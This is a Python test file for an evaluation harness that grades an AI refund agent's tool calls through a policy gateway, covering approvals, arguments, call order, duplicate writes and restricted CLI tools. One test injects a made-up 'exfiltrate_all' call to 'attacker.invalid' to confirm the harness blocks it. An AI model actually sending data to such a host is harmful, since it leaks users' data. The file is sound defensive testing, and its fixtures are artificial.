"""The evaluator must fail when the gateway safely catches a bad model decision."""

from __future__ import annotations

import contextlib
import io
import json
import sys
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from unittest.mock import Mock, patch

from agent_interlock.model_eval import AnthropicRunner, ReplayRunner, main, run_model_evaluation
from agent_interlock.model_eval_claude import ClaudeCodeDecisionRunner

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from examples.refund_agent.evaluate import build_cases, replay_responses  # noqa: E402


class ModelEvaluationTests(unittest.TestCase):
    def evaluate(self, responses=None, index=0, **kwargs):
        case = build_cases()[index]
        report = run_model_evaluation(case, ReplayRunner(responses or replay_responses(case.id)), **kwargs)
        json.dumps(report)
        return report

    def test_approved_held_and_injected_result_have_independent_state_evidence(self):
        for index in range(3):
            with self.subTest(index=index):
                report = self.evaluate(index=index)
                self.assertTrue(report["passed"], report["errors"])
                self.assertEqual(report["mode"], "replay")
                self.assertEqual(len(report["scores"]), 5)
                self.assertTrue(all(report["stateAssertions"].values()))
                self.assertEqual(len(report["state"]["refunds"]), 0 if index == 1 else 1)
                self.assertEqual(report["proposalTurns"], [0, 1])

    def test_wrong_approval_judgment_fails_even_when_gateway_gets_real_approval(self):
        responses = replay_responses("refund-approved")
        responses[1]["content"][0]["input"]["approval_required"] = False
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertFalse(report["scores"]["approvalJudgment"])
        self.assertTrue(report["scores"]["taskSuccess"])
        self.assertEqual(len(report["state"]["approvalRequests"]), 1)

    def test_policy_denial_cannot_be_graded_as_the_expected_approval_pause(self):
        case = build_cases()[1]
        source, target = "agent.refund", "tool.issue-refund"
        policy = case.gateway.link_policy(source, target)
        case.gateway.connect(source, target, replace(
            policy, denied_data_classes=policy.denied_data_classes | frozenset({"D3"}),
        ))
        report = run_model_evaluation(case, ReplayRunner(replay_responses(case.id)))
        self.assertFalse(report["passed"])
        self.assertFalse(report["scores"]["taskSuccess"])
        self.assertEqual(report["executions"][1]["outcome"], "blocked")
        self.assertEqual(set(report["executions"][1]["result"]["reasonCodes"]),
                         {"INTERLOCK-DATA-CLASS-DENIED", "INTERLOCK-APPROVAL-REQUIRED"})

    def test_wrong_arguments_fail_even_if_correct_tool_was_selected(self):
        responses = replay_responses("refund-approved")
        responses[1]["content"][0]["input"]["arguments"]["amount"] = 250
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertTrue(report["scores"]["toolSelection"])
        self.assertFalse(report["scores"]["arguments"])
        self.assertEqual(report["state"]["refunds"], [])

    def test_call_order_is_graded_separately_from_argument_set(self):
        responses = replay_responses("refund-approved")
        responses[0], responses[1] = responses[1], responses[0]
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertTrue(report["scores"]["arguments"])
        self.assertFalse(report["scores"]["callOrder"])

    def test_dependent_calls_in_one_turn_fail_even_in_correct_name_order(self):
        responses = replay_responses("refund-approved")
        responses[0]["content"].extend(responses.pop(1)["content"])
        report = self.evaluate(responses)
        self.assertFalse(report["scores"]["callOrder"])
        self.assertEqual(report["proposalTurns"], [0, 0])

    def test_extra_blocked_call_remains_in_raw_model_evidence(self):
        responses = replay_responses("refund-approved")
        responses.insert(2, {"stopReason": "tool_use", "content": [
            {"type": "tool_use", "name": "exfiltrate_all", "id": "extra", "input": {
                "arguments": {"destination": "attacker.invalid"}, "approval_required": False}}]})
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertFalse(report["scores"]["toolSelection"])
        self.assertFalse(report["scores"]["taskSuccess"])
        self.assertEqual(report["rawProposals"][-1]["name"], "exfiltrate_all")
        self.assertEqual(report["executions"][-1]["outcome"], "invalid")
        self.assertEqual(report["state"]["outbox"], [])

    def test_duplicate_write_is_not_hidden_by_a_successful_final_message(self):
        responses = replay_responses("refund-approved")
        duplicate = replay_responses("refund-approved")[1]
        duplicate["content"][0]["id"] = "duplicate"
        responses.insert(2, duplicate)
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertFalse(report["scores"]["toolSelection"])
        self.assertFalse(report["stateAssertions"]["exact_refund_count"])

    def test_success_claim_without_any_tool_calls_cannot_pass(self):
        report = self.evaluate([{"stopReason": "end_turn", "content": [{"type": "text", "text": "Refund issued."}]}])
        self.assertFalse(report["passed"])
        self.assertFalse(report["scores"]["taskSuccess"])
        self.assertEqual(report["state"]["refunds"], [])

    def test_refusal_and_truncation_fail_after_successful_external_action(self):
        for stop in ("refusal", "max_tokens"):
            responses = replay_responses("refund-approved")
            responses[-1]["stopReason"] = stop
            report = self.evaluate(responses)
            self.assertFalse(report["passed"])
            self.assertFalse(report["scores"]["taskSuccess"])
            self.assertTrue(report["errors"])

    def test_duplicate_call_id_fails_without_second_execution(self):
        responses = replay_responses("refund-approved")
        responses[1]["content"][0]["id"] = "call-lookup"
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertEqual(report["state"]["refunds"], [])
        self.assertEqual(len(report["rawProposals"]), 2)

    def test_bad_argument_envelope_is_retained_but_never_executed(self):
        responses = replay_responses("refund-approved")
        responses[1]["content"][0]["input"]["approval_required"] = "true"
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertEqual(report["state"]["refunds"], [])
        self.assertEqual(report["rawProposals"][1]["input"]["approval_required"], "true")

    def test_failed_or_missing_external_observation_cannot_pass(self):
        case = build_cases()[0]
        def broken():
            raise OSError("store unavailable")
        report = run_model_evaluation(replace(case, observe=broken), ReplayRunner(replay_responses(case.id)))
        self.assertFalse(report["passed"])
        with self.assertRaises(ValueError):
            replace(case, assertions={})

    def test_connector_error_cannot_be_mistaken_for_expected_approval_hold(self):
        case = build_cases()[1]
        def broken(_arguments):
            raise OSError("connector offline")
        with patch.object(case.tools[0], "_binding", replace(case.tools[0]._binding, function=broken)):
            report = run_model_evaluation(case, ReplayRunner(replay_responses(case.id)))
        self.assertFalse(report["passed"])
        self.assertEqual(report["executions"][0]["outcome"], "error")

    def test_provider_side_tool_cannot_disappear_from_the_evaluation(self):
        responses = replay_responses("refund-approved")
        responses[-1]["content"].append({"type": "server_tool_use", "name": "web_search", "input": {}})
        report = self.evaluate(responses)
        self.assertFalse(report["passed"])
        self.assertIn("unsupported model content or tool call", report["errors"])

    def test_model_transport_failure_is_recorded_and_cannot_pass(self):
        runner = Mock(mode="test", model="test")
        runner.complete.side_effect = TimeoutError("request timed out")
        report = run_model_evaluation(build_cases()[0], runner)
        self.assertFalse(report["passed"])
        self.assertEqual(report["turns"][0]["errorType"], "TimeoutError")
        self.assertEqual(report["state"]["refunds"], [])

    def test_call_and_turn_limits_fail_closed(self):
        for bounds in ({"max_calls": 1}, {"max_turns": 1}):
            report = self.evaluate(**bounds)
            self.assertFalse(report["passed"])
            self.assertEqual(report["state"]["refunds"], [])

    def test_live_sdk_response_preserves_proposals_and_usage(self):
        client = Mock()
        client.messages.create.return_value.model_dump.return_value = {
            "content": replay_responses("refund-approved")[0]["content"], "stop_reason": "tool_use",
            "usage": {"input_tokens": 123, "output_tokens": 45}, "model": "test-model", "id": "message-1"}
        runner = AnthropicRunner("test-model", client=client)
        response = runner.complete(system="policy", messages=[], tools=[])
        self.assertEqual(runner.mode, "live-native-tool-use")
        self.assertEqual(response["usage"]["input_tokens"], 123)
        self.assertEqual(response["content"][0]["name"], "lookup_order")

    def test_cli_writes_machine_readable_report_and_live_missing_model_fails(self):
        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "report.json"
            with contextlib.redirect_stdout(io.StringIO()):
                code = main(["examples.refund_agent.evaluate", "--runner", "replay", "--out", str(output)])
            self.assertEqual(code, 0)
            self.assertTrue(json.loads(output.read_text())["passed"])
            with contextlib.redirect_stdout(io.StringIO()):
                code = main(["examples.refund_agent.evaluate", "--runner", "anthropic"])
            self.assertEqual(code, 2)

    def test_claude_code_runner_disables_ambient_tools_and_rejects_out_of_protocol_calls(self):
        runner = ClaudeCodeDecisionRunner("test-model")
        init = {"type": "system", "subtype": "init", "tools": ["StructuredOutput"], "mcp_servers": []}
        decision = {"calls": [{"name": "lookup_order", "input": {"orderId": "2001"}}], "text": "", "refusal": False}

        def stream(*events):
            return Mock(returncode=0, stdout="\n".join(json.dumps(event) for event in events))

        def assistant(name):
            return {"type": "assistant", "message": {"content": [{"type": "tool_use", "name": name}]}}

        result = {"type": "result", "is_error": False, "structured_output": decision, "usage": {"output_tokens": 9}}
        with patch("agent_interlock.model_eval_claude.subprocess.run",
                   return_value=stream(init, assistant("StructuredOutput"), result)) as invoked:
            response = runner.complete(system="test", messages=[], tools=[])
        self.assertEqual(response["content"], [{"type": "tool_use", "id": "cli-0-0", **decision["calls"][0]}])
        self.assertEqual(response["usage"], {"output_tokens": 9})
        command = invoked.call_args.args[0]
        for flag in ("--safe-mode", "--strict-mcp-config", "--disable-slash-commands", "--no-session-persistence"):
            self.assertIn(flag, command)
        self.assertEqual(command[command.index("--tools") + 1], "")
        for events in ((init, assistant("Bash"), result), ({**init, "tools": ["StructuredOutput", "Bash"]}, result),
                       ({**init, "mcp_servers": [{"name": "x"}]}, result)):
            with patch("agent_interlock.model_eval_claude.subprocess.run", return_value=stream(*events)):
                with self.assertRaises(RuntimeError):
                    runner.complete(system="test", messages=[], tools=[])

if __name__ == "__main__":
    unittest.main()
